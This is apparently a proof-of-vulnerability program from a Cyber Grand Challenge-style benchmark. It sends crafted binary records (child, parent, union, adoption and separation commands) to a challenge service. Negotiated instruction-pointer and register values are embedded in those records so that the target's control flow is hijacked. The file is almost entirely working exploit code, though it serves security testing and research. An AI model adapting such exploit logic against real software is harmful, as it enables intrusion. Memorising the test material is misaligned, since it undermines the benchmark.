/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#include <libpov.h>
int main(void) {
   type1_vals t1vals = { 0 };
   uint32_t mask_eip, mask_reg;

   mask_eip = 0x0FFFFFFF;
   mask_reg = 0x0FFFFFFF;
   type1_negotiate(mask_eip, mask_reg, 2, &t1vals);

   t1vals.ipval |= 0xF0000000;   // make sure out of range of valid fn ptrs
   t1vals.regval |= 0xF0000000;  // make sure out of range of valid fn ptrs

   // parent1 regval
   // parent3 ipval
   unsigned int p1_val = t1vals.regval;
   unsigned int p3_val = t1vals.ipval;

   do {
      //*** writing data (child)
      static unsigned char write_00000_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\xa2\xac\x00\x00\xc6\x42\x63\x4b"
         "\x47\x4d\x42\x46\x67\x58\x44\x4c\x65\x44\x71\x55\x41\x52\x6c\x6e"
         "\x4b\x43\x45\x4a\x67\x70\x45\x65\x6c\x66\x64\x58";
      static unsigned int write_00000_00000_len = 44;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 4;
      read_00000 = (unsigned char*)malloc(read_00000_len);
      int read_00000_res = length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x05\xf7\x00\x00\x30\x0d\x72\x79"
         "\x4e\x6d\x64\x62\x69\x57\x4c\x49\x65\x53\x52\x51\x4a\x69\x70\x5a"
         "\x5a\x61\x67\x62\x71\x6e\x4b\x58\x5a\x71\x59\x4b";
      static unsigned int write_00001_00000_len = 44;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         transmit_all(1, write_00001, write_00001_len);
      }
      free(write_00001);
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 4;
      read_00001 = (unsigned char*)malloc(read_00001_len);
      int read_00001_res = length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data (parent1)
      static unsigned char write_00002_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x3e\x9f\x00\x00\x66\x4e\x70\x6f"
         "\x49\x74\x45\x59\x5a\x74\x53\x42\x67\x4d\x4a\x5a\x65\x78\x48\x41"
         "\x79\x4c\x4e\x69\x59\x76\x64\x55\x42\x53\x41\x4f";
      static unsigned int write_00002_00000_len = 44;

      unsigned int *buf = (unsigned int *)write_00002_00000;
      buf[2] = p1_val;

      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         transmit_all(1, write_00002, write_00002_len);
      }
      free(write_00002);
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** length read
      read_00002_len = 4;
      read_00002 = (unsigned char*)malloc(read_00002_len);
      int read_00002_res = length_read(0, read_00002, read_00002_len);
      if (read_00002_res) {} //silence unused variable warning
      free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00003_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x38\x39\x01\x00\xf8\x5e\x72\x5a"
         "\x44\x46\x72\x50\x4b\x4c\x6a\x4a\x6a\x43\x7a\x4a\x4c\x51\x6e\x58"
         "\x53\x51\x76\x6a\x55\x43\x62\x79\x46\x54\x79\x62";
      static unsigned int write_00003_00000_len = 44;
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = append_buf(write_00003, &write_00003_len, write_00003_00000, write_00003_00000_len);
      if (write_00003_len > 0) {
         transmit_all(1, write_00003, write_00003_len);
      }
      free(write_00003);
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** length read
      read_00003_len = 4;
      read_00003 = (unsigned char*)malloc(read_00003_len);
      int read_00003_res = length_read(0, read_00003, read_00003_len);
      if (read_00003_res) {} //silence unused variable warning
      free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00004_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\xd9\x2a\x01\x00\x08\x50\x78\x4b"
         "\x49\x63\x4c\x75\x78\x67\x4f\x78\x46\x76\x67\x6b\x51\x46\x45\x47"
         "\x6a\x49\x50\x69\x44\x53\x67\x54\x44\x4f\x75\x7a";
      static unsigned int write_00004_00000_len = 44;
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = append_buf(write_00004, &write_00004_len, write_00004_00000, write_00004_00000_len);
      if (write_00004_len > 0) {
         transmit_all(1, write_00004, write_00004_len);
      }
      free(write_00004);
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** length read
      read_00004_len = 4;
      read_00004 = (unsigned char*)malloc(read_00004_len);
      int read_00004_res = length_read(0, read_00004, read_00004_len);
      if (read_00004_res) {} //silence unused variable warning
      free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data (parent2)
      static unsigned char write_00005_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x5d\x60\x01\x00\x50\x47\x52\x64"
         "\x70\x4c\x74\x57\x6b\x78\x66\x5a\x54\x54\x41\x6b\x78\x78\x48\x64"
         "\x49\x69\x53\x67\x6c\x75\x4b\x45\x4d\x78\x43\x48";
      static unsigned int write_00005_00000_len = 44;
      unsigned char *write_00005 = NULL;
      unsigned int write_00005_len = 0;
      write_00005 = append_buf(write_00005, &write_00005_len, write_00005_00000, write_00005_00000_len);
      if (write_00005_len > 0) {
         transmit_all(1, write_00005, write_00005_len);
      }
      free(write_00005);
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** length read
      read_00005_len = 4;
      read_00005 = (unsigned char*)malloc(read_00005_len);
      int read_00005_res = length_read(0, read_00005, read_00005_len);
      if (read_00005_res) {} //silence unused variable warning
      free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00006_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\xe0\xb3\x00\x00\x6f\x72\x55\x7a"
         "\x6c\x71\x6c\x51\x58\x47\x76\x63\x6d\x4e\x56\x68\x73\x61\x58\x59"
         "\x6c\x6a\x66\x6f\x4d\x61\x55\x5a\x4e\x6a\x5a\x66";
      static unsigned int write_00006_00000_len = 44;
      unsigned char *write_00006 = NULL;
      unsigned int write_00006_len = 0;
      write_00006 = append_buf(write_00006, &write_00006_len, write_00006_00000, write_00006_00000_len);
      if (write_00006_len > 0) {
         transmit_all(1, write_00006, write_00006_len);
      }
      free(write_00006);
   } while (0);
   do {
      unsigned char *read_00006;
      unsigned int read_00006_len;
      unsigned int read_00006_ptr = 0;
      //**** length read
      read_00006_len = 4;
      read_00006 = (unsigned char*)malloc(read_00006_len);
      int read_00006_res = length_read(0, read_00006, read_00006_len);
      if (read_00006_res) {} //silence unused variable warning
      free(read_00006);
      if (read_00006_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00007_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x31\x59\x01\x00\xe6\xd6\x52\x52"
         "\x76\x78\x5a\x56\x72\x4d\x58\x41\x74\x76\x70\x50\x65\x77\x77\x79"
         "\x4b\x4f\x56\x55\x74\x72\x4d\x49\x5a\x47\x65\x5a";
      static unsigned int write_00007_00000_len = 44;
      unsigned char *write_00007 = NULL;
      unsigned int write_00007_len = 0;
      write_00007 = append_buf(write_00007, &write_00007_len, write_00007_00000, write_00007_00000_len);
      if (write_00007_len > 0) {
         transmit_all(1, write_00007, write_00007_len);
      }
      free(write_00007);
   } while (0);
   do {
      unsigned char *read_00007;
      unsigned int read_00007_len;
      unsigned int read_00007_ptr = 0;
      //**** length read
      read_00007_len = 4;
      read_00007 = (unsigned char*)malloc(read_00007_len);
      int read_00007_res = length_read(0, read_00007, read_00007_len);
      if (read_00007_res) {} //silence unused variable warning
      free(read_00007);
      if (read_00007_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data (parent3)
      static unsigned char write_00008_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x40\xc4\x00\x00\xb1\x1d\x41\x50"
         "\x4f\x54\x58\x57\x4b\x77\x70\x6d\x59\x50\x51\x76\x70\x46\x77\x48"
         "\x54\x46\x6e\x6d\x79\x43\x66\x54\x4c\x63\x57\x6f";
      static unsigned int write_00008_00000_len = 44;

      unsigned int *buf = (unsigned int *)write_00008_00000;
      buf[2] = p3_val;

      unsigned char *write_00008 = NULL;
      unsigned int write_00008_len = 0;
      write_00008 = append_buf(write_00008, &write_00008_len, write_00008_00000, write_00008_00000_len);
      if (write_00008_len > 0) {
         transmit_all(1, write_00008, write_00008_len);
      }
      free(write_00008);
   } while (0);
   do {
      unsigned char *read_00008;
      unsigned int read_00008_len;
      unsigned int read_00008_ptr = 0;
      //**** length read
      read_00008_len = 4;
      read_00008 = (unsigned char*)malloc(read_00008_len);
      int read_00008_res = length_read(0, read_00008, read_00008_len);
      if (read_00008_res) {} //silence unused variable warning
      free(read_00008);
      if (read_00008_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00009_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x5e\x5d\x01\x00\xe9\xa4\x4b\x5a"
         "\x61\x55\x65\x67\x55\x59\x62\x42\x77\x49\x65\x78\x7a\x57\x75\x53"
         "\x7a\x6e\x69\x6a\x59\x53\x74\x57\x69\x6e\x62\x50";
      static unsigned int write_00009_00000_len = 44;
      unsigned char *write_00009 = NULL;
      unsigned int write_00009_len = 0;
      write_00009 = append_buf(write_00009, &write_00009_len, write_00009_00000, write_00009_00000_len);
      if (write_00009_len > 0) {
         transmit_all(1, write_00009, write_00009_len);
      }
      free(write_00009);
   } while (0);
   do {
      unsigned char *read_00009;
      unsigned int read_00009_len;
      unsigned int read_00009_ptr = 0;
      //**** length read
      read_00009_len = 4;
      read_00009 = (unsigned char*)malloc(read_00009_len);
      int read_00009_res = length_read(0, read_00009, read_00009_len);
      if (read_00009_res) {} //silence unused variable warning
      free(read_00009);
      if (read_00009_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00010_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x09\x6e\x00\x00\xfb\x3e\x64\x47"
         "\x79\x78\x72\x64\x46\x74\x71\x59\x78\x56\x55\x42\x75\x73\x47\x77"
         "\x76\x59\x62\x58\x4b\x42\x6d\x68\x74\x4d\x4d\x4a";
      static unsigned int write_00010_00000_len = 44;
      unsigned char *write_00010 = NULL;
      unsigned int write_00010_len = 0;
      write_00010 = append_buf(write_00010, &write_00010_len, write_00010_00000, write_00010_00000_len);
      if (write_00010_len > 0) {
         transmit_all(1, write_00010, write_00010_len);
      }
      free(write_00010);
   } while (0);
   do {
      unsigned char *read_00010;
      unsigned int read_00010_len;
      unsigned int read_00010_ptr = 0;
      //**** length read
      read_00010_len = 4;
      read_00010 = (unsigned char*)malloc(read_00010_len);
      int read_00010_res = length_read(0, read_00010, read_00010_len);
      if (read_00010_res) {} //silence unused variable warning
      free(read_00010);
      if (read_00010_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00011_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x33\x6e\x00\x00\x9d\xbd\x4a\x70"
         "\x4e\x71\x62\x6a\x59\x68\x77\x65\x77\x78\x6b\x6d\x42\x4f\x42\x55"
         "\x45\x68\x58\x41\x42\x78\x6e\x46\x63\x4c\x62\x49";
      static unsigned int write_00011_00000_len = 44;
      unsigned char *write_00011 = NULL;
      unsigned int write_00011_len = 0;
      write_00011 = append_buf(write_00011, &write_00011_len, write_00011_00000, write_00011_00000_len);
      if (write_00011_len > 0) {
         transmit_all(1, write_00011, write_00011_len);
      }
      free(write_00011);
   } while (0);
   do {
      unsigned char *read_00011;
      unsigned int read_00011_len;
      unsigned int read_00011_ptr = 0;
      //**** length read
      read_00011_len = 4;
      read_00011 = (unsigned char*)malloc(read_00011_len);
      int read_00011_res = length_read(0, read_00011, read_00011_len);
      if (read_00011_res) {} //silence unused variable warning
      free(read_00011);
      if (read_00011_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00012_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\xd2\x3e\x00\x00\x7b\xe0\x5a\x55"
         "\x4b\x48\x6a\x59\x42\x47\x46\x64\x51\x6d\x62\x70\x47\x6d\x53\x7a"
         "\x5a\x48\x78\x73\x45\x5a\x75\x4c\x69\x4c\x56\x54";
      static unsigned int write_00012_00000_len = 44;
      unsigned char *write_00012 = NULL;
      unsigned int write_00012_len = 0;
      write_00012 = append_buf(write_00012, &write_00012_len, write_00012_00000, write_00012_00000_len);
      if (write_00012_len > 0) {
         transmit_all(1, write_00012, write_00012_len);
      }
      free(write_00012);
   } while (0);
   do {
      unsigned char *read_00012;
      unsigned int read_00012_len;
      unsigned int read_00012_ptr = 0;
      //**** length read
      read_00012_len = 4;
      read_00012 = (unsigned char*)malloc(read_00012_len);
      int read_00012_res = length_read(0, read_00012, read_00012_len);
      if (read_00012_res) {} //silence unused variable warning
      free(read_00012);
      if (read_00012_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00013_00000[] = 
         "\xa0\xa1\xa2\xa3\x24\x00\x00\x00\x90\x7f\x00\x00\x21\x64\x62\x6a"
         "\x72\x62\x6d\x59\x61\x59\x6e\x7a\x56\x72\x7a\x53\x59\x4b\x6e\x6a"
         "\x7a\x45\x6e\x58\x61\x48\x54\x49\x74\x6f\x42\x51";
      static unsigned int write_00013_00000_len = 44;
      unsigned char *write_00013 = NULL;
      unsigned int write_00013_len = 0;
      write_00013 = append_buf(write_00013, &write_00013_len, write_00013_00000, write_00013_00000_len);
      if (write_00013_len > 0) {
         transmit_all(1, write_00013, write_00013_len);
      }
      free(write_00013);
   } while (0);
   do {
      unsigned char *read_00013;
      unsigned int read_00013_len;
      unsigned int read_00013_ptr = 0;
      //**** length read
      read_00013_len = 4;
      read_00013 = (unsigned char*)malloc(read_00013_len);
      int read_00013_res = length_read(0, read_00013, read_00013_len);
      if (read_00013_res) {} //silence unused variable warning
      free(read_00013);
      if (read_00013_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data union parent1 parent2
      static unsigned char write_00014_00000[] = 
         "\xf0\xf1\xf2\xf3\x08\x00\x00\x00\x3e\x9f\x00\x00\x5d\x60\x01\x00";
      static unsigned int write_00014_00000_len = 16;

      unsigned int *buf = (unsigned int *)write_00014_00000;
      buf[2] = p1_val;

      unsigned char *write_00014 = NULL;
      unsigned int write_00014_len = 0;
      write_00014 = append_buf(write_00014, &write_00014_len, write_00014_00000, write_00014_00000_len);
      if (write_00014_len > 0) {
         transmit_all(1, write_00014, write_00014_len);
      }
      free(write_00014);
   } while (0);
   do {
      unsigned char *read_00014;
      unsigned int read_00014_len;
      unsigned int read_00014_ptr = 0;
      //**** length read
      read_00014_len = 4;
      read_00014 = (unsigned char*)malloc(read_00014_len);
      int read_00014_res = length_read(0, read_00014, read_00014_len);
      if (read_00014_res) {} //silence unused variable warning
      free(read_00014);
      if (read_00014_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data adpoted_child child, parent1, parent2
      static unsigned char write_00015_00000[] = 
         "\xac\xac\xac\xac\x0c\x00\x00\x00\xa2\xac\x00\x00\x3e\x9f\x00\x00"
         "\x5d\x60\x01\x00";
      static unsigned int write_00015_00000_len = 20;

      unsigned int *buf = (unsigned int *)write_00015_00000;
      buf[3] = p1_val;

      unsigned char *write_00015 = NULL;
      unsigned int write_00015_len = 0;
      write_00015 = append_buf(write_00015, &write_00015_len, write_00015_00000, write_00015_00000_len);
      if (write_00015_len > 0) {
         transmit_all(1, write_00015, write_00015_len);
      }
      free(write_00015);
   } while (0);
   do {
      unsigned char *read_00015;
      unsigned int read_00015_len;
      unsigned int read_00015_ptr = 0;
      //**** length read
      read_00015_len = 4;
      read_00015 = (unsigned char*)malloc(read_00015_len);
      int read_00015_res = length_read(0, read_00015, read_00015_len);
      if (read_00015_res) {} //silence unused variable warning
      free(read_00015);
      if (read_00015_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data separated parent1, parent2
      static unsigned char write_00016_00000[] = 
         "\x50\x11\x50\x11\x08\x00\x00\x00\x3e\x9f\x00\x00\x5d\x60\x01\x00";
      static unsigned int write_00016_00000_len = 16;

      unsigned int *buf = (unsigned int *)write_00016_00000;
      buf[2] = p1_val;

      unsigned char *write_00016 = NULL;
      unsigned int write_00016_len = 0;
      write_00016 = append_buf(write_00016, &write_00016_len, write_00016_00000, write_00016_00000_len);
      if (write_00016_len > 0) {
         transmit_all(1, write_00016, write_00016_len);
      }
      free(write_00016);
   } while (0);
   do {
      unsigned char *read_00016;
      unsigned int read_00016_len;
      unsigned int read_00016_ptr = 0;
      //**** length read
      read_00016_len = 4;
      read_00016 = (unsigned char*)malloc(read_00016_len);
      int read_00016_res = length_read(0, read_00016, read_00016_len);
      if (read_00016_res) {} //silence unused variable warning
      free(read_00016);
      if (read_00016_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data union parent1, parent3
      static unsigned char write_00017_00000[] = 
         "\xf0\xf1\xf2\xf3\x08\x00\x00\x00\x3e\x9f\x00\x00\x40\xc4\x00\x00";
      static unsigned int write_00017_00000_len = 16;

      unsigned int *buf = (unsigned int *)write_00017_00000;
      buf[2] = p1_val;
      buf[3] = p3_val;

      unsigned char *write_00017 = NULL;
      unsigned int write_00017_len = 0;
      write_00017 = append_buf(write_00017, &write_00017_len, write_00017_00000, write_00017_00000_len);
      if (write_00017_len > 0) {
         transmit_all(1, write_00017, write_00017_len);
      }
      free(write_00017);
   } while (0);
   do {
      unsigned char *read_00017;
      unsigned int read_00017_len;
      unsigned int read_00017_ptr = 0;
      //**** length read
      read_00017_len = 4;
      read_00017 = (unsigned char*)malloc(read_00017_len);
      int read_00017_res = length_read(0, read_00017, read_00017_len);
      if (read_00017_res) {} //silence unused variable warning
      free(read_00017);
      if (read_00017_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data separated parent1, parent3
      static unsigned char write_00018_00000[] = 
         "\x50\x11\x50\x11\x08\x00\x00\x00\x3e\x9f\x00\x00\x40\xc4\x00\x00";
      static unsigned int write_00018_00000_len = 16;

      unsigned int *buf = (unsigned int *)write_00018_00000;
      buf[2] = p1_val;
      buf[3] = p3_val;

      unsigned char *write_00018 = NULL;
      unsigned int write_00018_len = 0;
      write_00018 = append_buf(write_00018, &write_00018_len, write_00018_00000, write_00018_00000_len);
      if (write_00018_len > 0) {
         transmit_all(1, write_00018, write_00018_len);
      }
      free(write_00018);
   } while (0);
   do {
      unsigned char *read_00018;
      unsigned int read_00018_len;
      unsigned int read_00018_ptr = 0;
      //**** length read
      read_00018_len = 4;
      read_00018 = (unsigned char*)malloc(read_00018_len);
      int read_00018_res = length_read(0, read_00018, read_00018_len);
      if (read_00018_res) {} //silence unused variable warning
      free(read_00018);
      if (read_00018_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data adopted_child child, parent1, p_unk
      static unsigned char write_00019_00000[] = 
         "\xac\xac\xac\xac\x0c\x00\x00\x00\xa2\xac\x00\x00\x3e\x9f\x00\x00"
         "\x00\x00\x00\x00";
      static unsigned int write_00019_00000_len = 20;

      unsigned int *buf = (unsigned int *)write_00019_00000;
      buf[3] = p1_val;

      unsigned char *write_00019 = NULL;
      unsigned int write_00019_len = 0;
      write_00019 = append_buf(write_00019, &write_00019_len, write_00019_00000, write_00019_00000_len);
      if (write_00019_len > 0) {
         transmit_all(1, write_00019, write_00019_len);
      }
      free(write_00019);
   } while (0);
   do {
      unsigned char *read_00019;
      unsigned int read_00019_len;
      unsigned int read_00019_ptr = 0;
      //**** length read
      read_00019_len = 4;
      read_00019 = (unsigned char*)malloc(read_00019_len);
      int read_00019_res = length_read(0, read_00019, read_00019_len);
      if (read_00019_res) {} //silence unused variable warning
      free(read_00019);
      if (read_00019_ptr) {}  //silence unused variable warning if any
   } while (0);

}
